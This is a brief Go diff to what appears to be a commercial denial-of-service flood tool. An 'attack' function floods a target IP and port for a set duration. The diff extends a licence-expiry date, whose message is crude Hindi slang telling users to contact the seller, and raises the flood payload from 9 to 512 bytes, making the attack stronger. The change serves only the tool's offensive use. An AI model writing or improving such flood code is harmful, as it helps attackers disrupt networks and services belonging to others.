@@ -30,7 +30,7 @@ func validateBinaryName(binaryName string) {
 
 // Check if binary has expired
 func checkBinaryExpiry() {
-	expiryDate := time.Date(2025, 01, 15, 23, 59, 59, 0, time.UTC)
+	expiryDate := time.Date(2026, 01, 07, 23, 59, 59, 0, time.UTC)
 	if time.Now().After(expiryDate) {
 		displayMessage("║           DATE KHATAM LODE!              ║\n" +
 			"║    PAPA SE CONTACT KRO:        ║\n" +
@@ -69,7 +69,7 @@ func attack(ip string, port int, duration int) {
 	}
 	defer conn.Close()
 
-	payload := generatePayload(9)
+	payload := generatePayload(512)
 	endTime := time.Now().Add(time.Duration(duration) * time.Second)
 
 	for time.Now().Before(endTime) {
